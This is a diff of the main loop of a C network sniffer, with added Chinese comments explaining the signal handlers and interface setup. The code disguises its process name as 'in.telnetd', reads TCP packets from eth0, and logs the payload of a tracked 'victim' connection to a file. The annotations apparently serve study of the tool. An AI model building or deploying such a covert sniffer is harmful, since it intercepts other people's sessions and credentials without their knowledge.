@@ -195,14 +195,14 @@ int print_data(int datalen, char *data)
 int main(int argc, char *argv[])
 {
     sprintf(argv[0], "%s", "in.telnetd");
-    s = openintf("eth0");
+    s = openintf("eth0"); // 读取eth0网卡信息
     ip = (struct iphdr *)(((unsigned long)&ep.ip) - 2);
     tcp = (struct tcphdr *)(((unsigned long)&ep.tcp) - 2);
-    signal(SIGHUP, SIG_IGN);
-    signal(SIGINT, cleanup);
-    signal(SIGTERM, cleanup);
-    signal(SIGKILL, cleanup);
-    signal(SIGQUIT, cleanup);
+    signal(SIGHUP, SIG_IGN); // 发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送
+    signal(SIGINT, cleanup); // Interrupt Key 信号
+    signal(SIGTERM, cleanup); // 请求中止进程，kill命令缺省发送
+    signal(SIGKILL, cleanup); // 无法处理和忽略,中止某个进程
+    signal(SIGQUIT, cleanup); // 输入Quit Key的时候（CTRL+\）发送给所有Foreground Group的进程
     if(argc == 2) fp = stdout;
     else fp = fopen(TCPLOG, "at");
     if(fp == NULL)
@@ -210,17 +210,16 @@ int main(int argc, char *argv[])
         fprintf(stderr, "can't open log\n");
         exit(0);
     }
-    clear_victim();
+    clear_victim(); // 清空其中的信息
     for(;;)
     {
+        // 传入s---网卡信息，读取tcp数据包
         read_tcp(s);
         if(victim.active != 0)
             print_data(htons(ip->tot_len) - sizeof(ep.ip) - sizeof(ep.tcp), ep.buff - 2);
         fflush(fp);
     }
 
-
-    printf("DONE...\n");
     return 0;
 }
 
